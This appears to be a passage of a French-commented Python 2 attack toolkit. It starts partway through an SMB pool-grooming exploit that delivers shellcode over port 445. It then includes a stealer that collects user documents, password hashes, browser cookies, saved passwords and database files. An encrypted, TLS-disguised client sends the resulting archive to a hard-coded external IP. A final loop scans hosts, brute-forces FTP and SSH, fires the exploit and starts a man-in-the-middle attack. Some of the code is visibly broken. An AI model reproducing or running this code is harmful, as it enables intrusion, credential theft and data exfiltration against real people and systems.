	# - ExecuteTransaction() (smbtrans.c#L82)
	#   - Call dispatch table (smbtrans.c#L347)
	#   - Dispatch table is defined at srvdata.c#L972 (target is command 0, SrvSmbOpen2() function)
	# - SrvSmbOpen2() (smbopen.c#L1002)
	#   - call SrvOs2FeaListToNt() (smbopen.c#L1095)
	
	# https://msdn.microsoft.com/en-us/library/ee441720.aspx
	# Send special feaList to a target except last fragment with SMB_COM_NT_TRANSACT and SMB_COM_TRANSACTION2_SECONDARY command
	# Note: cannot use SMB_COM_TRANSACTION2 for the exploit because the TotalDataCount field is USHORT
	# Note: transaction max data count is 66512 (0x103d0) and DataDisplacement is USHORT
	progress = send_nt_trans(conn, tid, 0, feaList, '\x00'*30, 2000, False)
	# we have to know what size of NtFeaList will be created when last fragment is sent

	# make sure server recv all payload before starting allocate big NonPaged
	#sendEcho(conn, tid, 'a'*12)

	# create buffer size NTFEA_SIZE-0x1000 at server
	# this buffer MUST NOT be big enough for overflown buffer
	allocConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x1010)
	
	# groom nonpaged pool
	# when many big nonpaged pool are allocated, allocate another big nonpaged pool should be next to the last one
	srvnetConn = []
	for i in range(numGroomConn):
		sk = createConnectionWithBigSMBFirst80(target)
		srvnetConn.append(sk)

	# create buffer size NTFEA_SIZE at server
	# this buffer will be replaced by overflown buffer
	holeConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x10)
	# disconnect allocConn to free buffer
	# expect small nonpaged pool allocation is not allocated next to holeConn because of this free buffer
	allocConn.get_socket().close()

	# hope one of srvnetConn is next to holeConn
	for i in range(5):
		sk = createConnectionWithBigSMBFirst80(target)
		srvnetConn.append(sk)
		
	# send echo again, all new 5 srvnet buffers should be created
	#sendEcho(conn, tid, 'a'*12)
	
	# remove holeConn to create hole for fea buffer
	holeConn.get_socket().close()

	# send last fragment to create buffer in hole and OOB write one of srvnetConn struct header
	send_trans2_second(conn, tid, feaList[progress:], progress)
	recvPkt = conn.recvSMB()
	retStatus = recvPkt.getNTStatus()
	# retStatus MUST be 0xc000000d (INVALID_PARAMETER) because of invalid fea flag
	if retStatus == 0xc000000d:
		print('good response status: INVALID_PARAMETER')
	else:
		print('bad response status: 0x{:08x}'.format(retStatus))
		

	# one of srvnetConn struct header should be modified
	# a corrupted buffer will write recv data in designed memory address
	for sk in srvnetConn:
		sk.send(fake_recv_struct + shellcode)

	# execute shellcode by closing srvnet connection
	for sk in srvnetConn:
		sk.close()

	# nicely close connection (no need for exploit)
	conn.disconnect_tree(tid)
	conn.logoff()
	conn.get_socket().close()

#
# Recherche de docs
#
class info_search():

	def __init__(self):
		self.argParse()

    	def argParse(self):

        	#Creation du parser
        	parser = argparse.ArgumentParser(description='Usage script info_search.py')
        	#Ajout des options dans un groupe specifique
        	options = parser.add_argument_group('options','')
        	#Liste des options disponibles
        	options.add_argument('-a', '--all', action="store_true", dest='all', default=False, help="Dump all files list in -f option")
        	options.add_argument('-c', '--char', action="store", dest='char', type=str, default=False, help="Dump files by charactere of your choice")
        	options.add_argument('-f','--format', action="store", dest='format', type=str, choices=['doc','docx','xls','xlsx','csv','ppt','pptx','txt','pst','jpg','png','pdf','vsd','vsdx','zip','rar'], default=False, help="Dump files of your choice")
        	options.add_argument('-p', '--password', action="store_true", default=False, dest='hash', help="Dump sam file (hash password)")
        	options.add_argument('-b', '--browser', default=False, dest='browser', action="store_true", help="Dump browser cookies and passwords")
        	options.add_argument('-d', '--db', default=False, dest='database', action="store_true", help="Dump database")
	
        	#On parse les arguments
        	args = parser.parse_args()

        	self.all = args.all
        	self.char = args.char
        	self.format = args.format
        	self.hash = args.hash
        	self.browser= args.browser
        	self.database = args.database
		

    	def parse_all(self):
		
        	path_docs = os.getcwd()                                     #Chemin ou l'on met les fichiers recoltes
        	if not os.path.exists(os.getcwd()+'\\dataDump'):            #Vérification que le dossier n'existe pas
		    os.mkdir(os.getcwd()+'\\dataDump')                      #Creation du dossier de récupération
		dataDump = os.getcwd()+'\\dataDump'                         #Chemin ou sont stockés les fichiers récupérés
		username = getpass.getuser()                                #Recuperation du nom de l'utilisateur courant
		#rootDir = 'C:\\'
		rootDir = 'C:\\Users'+'\\'+''+username+'\\Documents'+'\\'   #Racine à partir de laquelle on lance la recherche d'informations

		for dirName, subdirList, fileList in os.walk(rootDir):
		    fichier = open("Directory_Tree.txt", 'a')               #Ouverture du fichier "Directory_Tree.txt" contenant l'aborescence parcouru
		    fichier.write('\n %s' % dirName)
		    fichier.write('\n %s' % subdirList)
		    fichier.write('\n %s' % fileList)
		    fichier.write('\n *********************************************************************')                
		    fichier.close()

		    for file in fileList :
			filename, extension = file.rsplit('.', 1)
			print('filename: '+filename)
			print('extension: '+extension)
			try:
			    if extension == 'txt':
				shutil.copy2(dirName+'\\'+file, dataDump)
			    if extension == 'doc'or extension == 'docx':
				shutil.copy2(dirName+'\\'+file, dataDump)
			    if extension == 'xls' or extension == 'xlsx' or extension == 'csv':
				shutil.copy2(dirName+'\\'+file, dataDump)
			    if extension == 'ppt'or extension == 'pptx':
				shutil.copy2(dirName+'\\'+file, dataDump)
			    if extension == 'pst':
				shutil.copy2(dirName+'\\'+file, dataDump)
			    if extension == 'jpg':
				shutil.copy2(dirName+'\\'+file, dataDump)
			    if extension == 'png':
				shutil.copy2(dirName+'\\'+file, dataDump)
			    if extension == 'pdf':
				shutil.copy2(dirName+'\\'+file, dataDump)   
			    if extension == 'vsd'or extension == 'vsdx':
				shutil.copy2(dirName+'\\'+file, dataDump)
			    if extension == 'zip':
				shutil.copy2(dirName+'\\'+file, dataDump)
			    if extension == 'rar':
				shutil.copy2(dirName+'\\'+file, dataDump)
			except:
			    print("[Error] Extension '"+extension+"' non prise en charge")
		print("[DONE] parse with char")

				
	def parse_with_char(self):

        	path_docs = os.getcwd()
		if not os.path.exists(os.getcwd()+'\\dataDump'):
		    os.mkdir(os.getcwd()+'\\dataDump')
		dataDump = os.getcwd()+'\\dataDump'
		username = getpass.getuser()
		#rootDir = 'C:\\'
		rootDir = 'C:\\Users'+'\\'+''+username+'\\Documents'+'\\'

		char_choice = glob.glob(str(self.char))
		for dirName, subdirList, fileList in os.walk(rootDir):
		    fichier = open("Directory_Tree.txt", 'a')
		    fichier.write('\n %s' % dirName)
		    fichier.write('\n %s' % subdirList)
		    fichier.write('\n %s' % fileList)
		    fichier.write('\n *********************************************************************')                
		    fichier.close()

		    for file in fileList : 
			filename, extension = file.rsplit('.', 1)
			if filename == self.char:
			    #print("Copie de "+dirName+ '\\'+file+' vers '+dataDump)
			    shutil.copy2(dirName+'\\'+file, dataDump)
		print("[DONE] parse with char")


	def parse_with_format(self):
		
        	path_docs = os.getcwd()
		if not os.path.exists(os.getcwd()+'\\dataDump'):
		    os.mkdir(os.getcwd()+'\\dataDump')
		dataDump = os.getcwd()+'\\dataDump'
		username = getpass.getuser()
		#rootDir = 'C:\\'
		rootDir = 'C:\\Users'+'\\'+''+username+'\Documents'

		for dirName, subdirList, fileList in os.walk(rootDir):
		    fichier = open("Directory_Tree.txt", 'a')
		    fichier.write('\n %s' % dirName)
		    fichier.write('\n %s' % subdirList)
		    fichier.write('\n %s' % fileList)
		    fichier.write('\n *********************************************************************')                
		    fichier.close()
		    for file in fileList : 
			filename, extension = file.rsplit('.', 1)
			if extension == self.format:
			    #print("Copie de "+dirName+ '\\'+file+' vers '+dataDump)
			    shutil.copy2(dirName+'\\'+file, dataDump)
		print("[DONE] parse with format")

	def dump_browser(self):

        	path_docs = os.getcwd()
		if not os.path.exists(os.getcwd()+'\\dataDump'):
		    os.mkdir(os.getcwd()+'\\dataDump')
		dataDump = os.getcwd()+'\\dataDump'
		username = getpass.getuser()

		#IE
		# path_ie_cookies_a = 'C:\Users' + '\\' + username + '\AppData\Roaming\Microsoft\Windows\Cookies'
		# path_ie_cookies_b = 'C:\Users' + '\\' + username + '\AppData\Roaming\Microsoft\Windows\Cookies\Low'
		# path_ie_mdp = 'C:\Users' + '\\' + username + '\Application Data\Microsoft\Credentials'

		if bool(path_ie_cookies_a) == True:
		    ie_cookies_a = glob.glob(str(path_ie_cookies_a))
		    for names in ie_cookies_a:
			#print (names)
			shutil.copy2(str(ie_cookies_a), dataDump)
		if bool(path_ie_cookies_b) == True:
		    ie_cookies_b = glob.glob(str(path_ie_cookies_b))
		    shutil.copy2(str(ie_cookies_b), dataDump)        
		if bool(path_ie_mdp) == True:
		    ie_mdp = glob.glob(str(path_ie_mdp))
		    shutil.copy2(str(ie_mdp), dataDump) #Http Authentication Passwords

		#Firefox
		# path_fi_cookies = 'C:\Users' + '\\' + username + '\Application Data\Mozilla\Firefox\Profiles\npt2xs4d.default\cookies\sqlite'
		# path_fi_mdp = 'C:\Users' + '\\' + username + '\Application Data\Mozilla\Firefox\Profiles\npt2xs4d.default\key3.db'

		if bool(path_fi_cookies) == True:
		    fi_cookies = glob.glob(str(path_fi_cookies))
		    shutil.copy2(str(fi_cookies), dataDump)
		if bool(path_fi_mdp) == True:
		    fi_mdp = glob.glob(str(path_fi_mdp))
		    shutil.copy2(str(fi_mdp), dataDump)

		#Chrome
		# path_ch_cookies = 'C:\Users' + '\\' + username + '\Application Data\Google\Chrome\UserData\Default\Cache'
		# path_ch_mdp = 'C:\Users' + '\\' + username + '\Application Data\Google\Chrome\User\Data\Default\Web Data'

		if bool(path_ch_cookies) == True:
		    ch_cookies = glob.glob(str(path_ch_cookies))
		    shutil.copy2(str(ch_cookies), dataDump)
		if bool(path_ch_mdp) == True:
		    ch_mdp = glob.glob(str(path_ch_cookies))
		    shutil.copy2(str(ch_mdp), dataDump)

					
	def dump_database(self):

        	#MySQL
		path_mysql = 'C:\Program Files\MySQL\Data'
		if not os.path.exists(os.getcwd()+'\\dataDump'):
		    os.mkdir(os.getcwd()+'\\dataDump')
		    dataDump = os.getcwd()+'\\dataDump'

		if bool(path_mysql) == True:
		    data_mysql = glob.glob(str(path_mysql))
		    shutil.copy2(data_mysql, dataDump)
 

	def archivage(self):

        	ath_docs = os.getcwd()
		if not os.path.exists(os.getcwd()+'\\dataDump'):
		    os.mkdir(os.getcwd()+'\\dataDump')
		dataDump = os.getcwd()+'\\dataDump'
		shutil.move(path_docs+'\\'+'Directory_Tree.txt', dataDump)
		shutil.make_archive('zipDump', 'zip', dataDump)
		if os.path.exists(os.getcwd()+'\\dataDump'):
		    shutil.rmtree(os.getcwd()+'\\dataDump')
		print("[DONE] archivage")

			
	def main_infosearch(self):

        	myinstance = info_search()
		if self.all == True and self.char == False and self.format == False:
		    myinstance.parse_all()
		elif bool(self.char) == True and self.all == False:
		    myinstance.parse_with_char()
		elif bool(self.format) == True and self.all == False:
		    myinstance.parse_with_format()
		elif self.hash == True:
		    myinstance.dump_pass()
		elif self.browser == True:
		    myinstance.dump_browser()
		elif self.database == True:
		    myinstance.dump_database()

		if self.all == True or bool(self.char) == True or bool(self.format) == True or self.hash == True or self.browser == True or self.database == True:
		    try:
			myinstance.archivage()
		    except:
			print("[Error] zip error")
		if self.all == False and self.char == False and self.format == False and self.hash == False and self.browser == False and self.database == False:
		    print ("[Error] Add arguments to launch script")

	myinstanceglobal = info_search()
	myinstanceglobal.main()
	
#
##Exfiltration
###
def chunkstring(s, n):
	return [ s[i:i+n] for i in xrange(0, len(s), n) ]

class AESCipher(object):

	def __init__(self, key):
		self.bs = 32
        	self.key = hashlib.sha256(key.encode()).digest()

    	def encrypt(self, raw):
        	raw = self._pad(raw)
        	iv = Random.new().read(AES.block_size)
        	cipher = AES.new(self.key, AES.MODE_CBC, iv)
        	return iv + cipher.encrypt(raw)

    	def decrypt(self, enc):
        	# enc = base64.b64decode(enc)
        	iv = enc[:AES.block_size]
        	cipher = AES.new(self.key, AES.MODE_CBC, iv)
        	return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    	def _pad(self, s):
        	return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    	@staticmethod
    	def _unpad(s):
        	return s[:-ord(s[len(s)-1:])]


class HTTPSExfiltrationClient():

	def __init__(self, host, key, port=443, max_size=8192):
        	self.host = host
        	self.port = port
        	self.max_size = max_size
        	self.AESDriver = AESCipher(key=key)

        	self.sock = None

        	# Initiate the socket
        	check = self._pretendSSL()
        	if check is not 0:
            		sys.exit(1)
        	check = self._createRealSocket()
        	if check is not 0:
            		sys.exit(1)


	def _pretendSSL(self):
		try:
			response = urllib2.urlopen('https://%s:%s/' % (self.host, self.port))
			html = response.read()
		except urllib2.URLError, e:
			return 0
		except socket.error, e:
			sys.stderr.write("[!]\tCould not reach server to fake SSL handshake!\n")
			return 1
		except ssl.CertificateError:
			# Certificates does not match
			return 0


	def _createRealSocket(self):
		try:
			sock = socket.socket()
			sock.connect((self.host, self.port))
			self.sock = sock
			return 0
		except socket.error, e:
			sys.stderr.write("[!]\tCould not setup a connection to %s. Error:\n%s.\n" % (self.host, e))
			return 1


	def sendData(self, data):
		time.sleep(0.2)
		if self._createRealSocket() is 1:
			return 1

		dat = self.AESDriver.encrypt(data)

		try:
			packet_length = chr(len(dat))
		except ValueError:
			sys.stderr.write("[-]\tData is too long to send.\n")
			return 1

		if len(packet_length) == 1:
			packet_length = "\x00" + packet_length
		elif len(packet_length) == 2:
			pass
		else:
			sys.stderr.write("[!]\tPacket is too big.\n")
			return 1

		pckt = "\x17\x03\x03"+packet_length+dat
		self.sock.send(pckt)
		self.sock.close()
		sys.stdout.write("[.]\tSent '%s/%s'.\n" % (len(dat), len(pckt)))
		return 0

	def _roundItUp(self, my_int):

		try:
			as_char = chr(my_int)
		except ValueError:
			return 1

		if len(as_char) == 0:
			return "\x00\x00"

		elif len(as_char) == 1:
			return "\x00" + as_char

		elif len(as_char) == 2:
			return as_char

		else:
			return 1


	def sendFile(self, file_path):

		# Read the file
		try:
			f = open(file_path, 'rb')
			data = f.read()
			f.close()
			sys.stdout.write("[+]\tFile '%s' was loaded for exfiltration.\n" % file_path)
		except IOError, e:
			sys.stderr.write("[-]\tUnable to read file '%s'.\n%s.\n" % (file_path, e))
			return 1

		if len(data) < self.max_size -9:
			enc_data = self.AESDriver.encrypt(data)
			chunk_len = "\x00\x00"
			self.sock.send("\x17\x03\x03" + chunk_len + "\x00\x01" + "\x00\x01" + enc_data)
			sys.stdout.write("[+]\tSent file in one chunk.\n")
			return 0

		# Split into chunks by max size
		chunks = chunkstring(data, self.max_size-9)

		# Build Chunks in Order:
		transmit_blocks = []
		blocks_count = self._roundItUp(len(chunks))
		i = 0

		for chunk in chunks:
			i += 1
			enc_data = self.AESDriver.encrypt(chunk)
			chunk_len = self._roundItUp(len(enc_data))
			this_packet = self._roundItUp(i)

			if chunk_len == 1:
				# No data to encode
				pass

			else:
				this = "\x17\x03\x03" + chunk_len + this_packet + blocks_count + enc_data
				transmit_blocks.append(this)

		# Send the data
		i = 0
		for block in transmit_blocks:
			i += 1
			sys.stdout.write("[.]\tSending block %s/%s - len(%s).\n" % (i, len(transmit_blocks), len(block)-9))
			try:
				self.sock.send(block)
			except:
				self._createRealSocket()
				self.sock.send(block)
			time.sleep(0.2)
		return 0


	def close(self):
		self._createRealSocket()
		time.sleep(0.1)
		self.sock.send("\x17\x03\x03\x16\x05\x16")
		self.sock.close()
		return 0

#main

print "[*] récupération des documents spécifiques"
myinstanceglobal = info_search()
myinstanceglobal.main_infosearch()
print "[*] fichier enregistré sous collecte.zip"
client = HTTPSExfiltrationClient(host='213.32.112.42', key="123")
client.sendFile("ZipDump.zip")
client.close()



for i in ip_range:
	current_target = ip_start + str(i)
	print current_target
	# on check si la victime est "up"
	if checkhost(current_target) == True:
		print "[*] les Scan a démmaré a " + strftime("%H:%M:%S") + "!\n"
		# confirmation debut du scan
		for port in ports:
			if scanport(port) == True: # Test result
				print "[*] Port: ",port, " OUVERT a l'attaque"
				if port == 21:
					print "[*]debut du bruteforce FTP"
					bruteFTP(current_target)
					print "[*]fin du bruteforce FTP"

				elif port == 22:
					print "[*]debut du bruteforce SSH"
					bruteSsh(current_target)
					print "[*]fin du bruteforce SSH"

				elif port == 25:
					smtp_enum(host=current_target,port=port)

				elif port == 135:
					print "[*] DCOMRPC - not working.. yet"	

				elif port == 445:
					numGroomConn = 13
					exploit(current_target, sc, numGroomConn)
				else:
					print "[*] Port non-exploitable"

		stop_clock = datetime.now() 
		total_time = stop_clock - start_clock # Calculate scan time
		print "\n[*] Scan Terminé" # Confirm scan stop
		print "[*] Durée du scan: " + str(total_time) # Print scan time

		print "[*] Debut du man in the middle"
		mitm()
		print "[*] fin du man in the middle"


	else:
		continue
